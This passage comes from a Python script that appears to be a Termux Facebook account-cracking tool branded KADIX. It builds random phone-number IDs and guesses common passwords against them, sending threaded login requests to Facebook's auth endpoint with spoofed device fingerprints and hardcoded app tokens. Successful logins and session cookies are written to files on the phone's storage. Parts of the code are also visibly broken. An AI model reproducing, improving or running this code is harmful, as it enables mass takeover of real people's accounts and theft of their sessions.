                                passlist = [psx,ids,'i love you','iloveyou','free fire','freefire','57273200']
                                SHADOW.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python SHADOW.py')

def afg():
                user=[]
                clear()
                print('\033[1;37m Example : 9377,9379,9374')
                code = input('\033[1;37m Put Code : ')
                try:
                        limit = int(input('\033[1;37m Example : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as SHADOW:     
                        clear()
                        
                        tl = str(len(user))
                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mTotal id : \033[1;97m'+tl)
                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mSelect code :\033[1;97m '+code)
                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mⓋⒺⓃⓄⓂ Crack Has Been Running \n \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mUse Airplane after 2 minutes')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
                                SHADOW.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python .py')
def ind():
                user=[]
                clear()
                print('\033[1;37m Example : 91***,etc')
                code = input('\033[1;37m Put Code : ')
                try:
                        limit = int(input('\033[1;37m Example : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as SHADOW:     
                        clear()
                        
                        tl = str(len(user))
                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mTotal id : \033[1;97m'+tl)
                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mSelect code :\033[1;97m '+code)
                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mKADIX Crack Has Been Running \n \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mUse Airplane after 2 minutes')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'57273200','hindustan','kingkhan','india123','59039200','57575751']
                                SHADOW.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python KADIX.py')

def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[38;5;48m [\033[38;5;208mKADIX-𝐌1\033[38;5;48m]\033[1;97m %s|\033[1;92mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        inform = random.choice(['X697''X663', 'X663B','PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])
                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        network = random.choice(['Zong','null','Banglalink','Roshan','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBPN/{str(fbs)};FBLC/en_US;FBCR/null;FBMF/Oppo;FBBD/Oppo;FBDV/{random.choice(mamu)};FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=2.0,width=720,height=1440};'+'FB_FW/1;]"+"[FBPN/{str(fbs)};FBLC/en_US;FBCR/null;FBMF/Oppo;FBBD/Oppo;FBDV/{random.choice(mamu)};FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=2.0,width=720,height=1440};'+'FB_FW/1;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {'adid': adid,
'format': 'json',
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'secure_family_device_id': str(uuid.uuid4()),
'cpl': 'true',
'try_num': '1',
'email': ids,
'password': pas,
'method': 'auth.login',
'generate_analytics_claim':'1',
'community_id':'',
'cpl':'true',
'try_num':'1',
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
'openid_emails': "['01710940017']",
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
'fb4a_shared_phone_cpl_experiment':'fb4a_shared_phone_nonce_cpl_at_risk_v3',
'fb4a_shared_phone_cpl_group':'enable_v3_at_risk',
'enroll_misauth':'false',
'generate_session_cookies':'1',
'error_detail_type':'button_with_disabled',
'source':'account_recovery',
'generate_machine_id':'1',
'jazoest':'2980',
'meta_inf_fbmeta':'V2_UNTAGGED',
'encrypted_msisdn':'',
'currently_logged_in_userid':'0',
'locale': 'en_US',
'client_country_code': 'US',
'fb_api_req_friendly_name':'autheticate',
'fb_api_caller_class':'Fb4aAuthHandler',
'api_key':'882a8490361da98702bf97a021ddc14d',
'access_token':'256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
'sig':'4c854da0db9429f4913c2a1b221c1d30'}
                        headers = {'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2.700000047683716',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'viewport-width': '980',}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [KADIX-𝐎𝐊] '+ids+' | '+pas+'\033[1;97m')                  
                                        open('/sdcard/KADIX-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[KADIX-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;91m [KADIX-𝐂𝐏] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/KADIX-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/KADIX-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(10)
        except Exception as e:
            pass
#m2
#b-graph method        
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[38;5;48m [\033[38;5;208mKADIX-𝐌2\033[38;5;48m]\033[1;97m %s|\033[1;92mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
                        mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])
                        mmm = random.choice(['Ruby', 'V10 (AT&T)', 'V10 (T-Mobile)', 'V10 (Verizon)', 'V1Max', 'V20', 'V20 (AT&T)', 'V20 (Sprint)', 'V20 (T-Mobile)', 'V20 (Verizon)', 'V3', 'V5', 'V5s', 'V7', 'V7 Plus', 'V808', 'V9', 'Valencia', 'Vdeo 2', 'Vega Iron 2 WiFi', 'Vibe K5', 'Vibe K5 Note', 'Vibe K5 Plus Dual SIM', 'Vibe X', 'Vibe Z', 'Vision', 'Vision 3 Dual SIM', 'Volt LS740', 'VR Bot 552', 'VX5500', 'Y21', 'Y21L', 'Y28', 'Y3 (2018)', 'Y336-U02', 'Y5 Dual SIM (2017)', 'Y5 II', 'Y5 Prime 2018 Dual SIM', 'Y51', 'Y51L', 'Y55L', 'Y6 (2018)', 'Y6 Dual SIM (2018)', 'Y6 Prime (2018)', 'Y65', 'Y66', 'Y69', 'Y71', 'Y81', 'Y83', 'Yota Phone 2', 'YP-GI1'])
                        bbbb = random.choice(['PQ3B.190801.002', 'PQ1A.181205.002.A1', 'G950FXXU4DSBA', 'G950FXXS5DSF1', 'G950FXXS8DTC6', 'G998USQU1ATCU', 'G985FXXU7DTJ2', 'N986BXXU1BTJ4', 'A525FXXU3AUG4', 'T970XXU3BUI7', 'F916BXXU1BTKF', 'N970FXXS8ETK4', 'G975USQU4ETG1', 'A715FXXU3ATI8', 'T500XXU3BUA8', 'OPM6.171019.030.K1', 'OPM2.171026.006.C1', 'TQ1A.230105.001.A3', 'SQ1A.211205.008', 'SD1A.210817.037.A1', 'RP1A.201005.004.A1', 'PQ1A.181205.006', 'N9F27L', 'PPR1.180610.011', 'PPR2.180905.006', 'QP1A.191105.003', 'RD1A.201105.003.C1', 'MMB29U', 'NDE63H', 'N4F26J', 'NMF27D', 'N4F26X', 'KOT49H', 'JWR66L', 'LMY48G', 'LMY48J', 'MDB08M', 'HLK75H', 'HLK75F', 'HRI83', 'HLK75C', 'EPE54B', 'G950FXXU3CRGH', 'G950FXXS6DTA1'])
                        mmmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
                        mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  ="[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.82,width=1605,height=633};FBLC/es_ES;FBRV/'+fbrv+';FBCR/459657077;FBMF/Huawei;FBBD/Apple;FBPN/com.facebook.katana;FBDV/Device-9601;FBSV/'+fbsv+';FBOP/19;FBCA/armeabi-v8a;]"+"[FBPN/{str(fbs)};FBLC/en_US;FBCR/null;FBMF/Oppo;FBBD/Oppo;FBDV/{random.choice(mamu)};FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=2.0,width=720,height=1440};'+'FB_FW/1;]"+"[FBCR/banglalink;FBMF/asus;FBBD/asus;'+f'FBPN/{str(fbs)};FBDV/{random.choice(mamu)};FBSV/7.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {
                                'User-Agent': ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '25227',
'X-FB-SIM-HNI': '29752',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '706'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [KADIX-𝐎𝐊] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print(f"\r\r{B}[{G}COOKIE{B}]>{A} "+coki)                        
                                        open('/sdcard/KADIX/KADIX-OK.txt','a').write(ids+'|'+pas+'\n')
                                        open('/sdcard/KADIX/KADIX-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[𝐒𝐇𝐀𝐃𝐎𝐖-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;91m [KADIX-𝐂𝐏] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/KADIX-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/KADIX-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[38;5;48m [\033[38;5;208mKADIX-𝐌3\033[38;5;48m]\033[1;97m %s|\033[1;92mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";FBAN/FB4A;FBAV/191.70.14.47;FBBV/98728977;FBDM/{density=1.4,width=1103,height=1552};FBLC/en_US;FBRV/33174937;FBCR/null;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/4.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/Orca-Android;FBAV/263.0.0.2210;FBPN/com.facebook.orca;FBLC/it_IT;FBBV/844157397;FBCR/Magyar Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-T561|KTU84P;FBSV/10.2.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1306,height=1504};FB_FW/1;FBRV/844157397:;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {'adid' : str(uuid.uuid4()),
'format' : 'json',
'device_id' : str(uuid.uuid4()),
'email' : uid,
'password' : pw,
'generate_analytics_claim' : '1',
'community_id' : '',
'linked_guest_account_userid' :'',
'cpl' : 'true',
'try_num' : '1',
'family_device_id' : str(uuid.uuid4()),
'secure_family_device_id' : str(uuid.uuid4()),
'sim_serials' : ["00920088911210748054"],
'credentials_type' : 'password',
'fb4a_shared_phone_cpl_experiment' : 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
'fb4a_shared_phone_cpl_group' : 'enable_v3_at_risk',
'enroll_misauth' : 'false',
'generate_session_cookies' : '1',
'error_detail_type' : 'button_with_disabled',
'source' : 'login',
'generate_machine_id' : '1',
'jazoest' : '22377',
'meta_inf_fbmeta' : 'V2_UNTAGGED',
'advertiser_id' : str(uuid.uuid4()),
'encrypted_msisdn': '',
'currently_logged_in_userid' : '0',
'locale' : 'fr_DZ',
'client_country_code' : 'DZ',
'fb_api_req_friendly_name' : 'authenticate',
'fb_api_caller_class' : 'Fb4aAuthHandler',
'api_key' : '882a8490361da98702bf97a021ddc14d',
'sig' : 'e5abae6d6564813bfadc6dcd42256834',
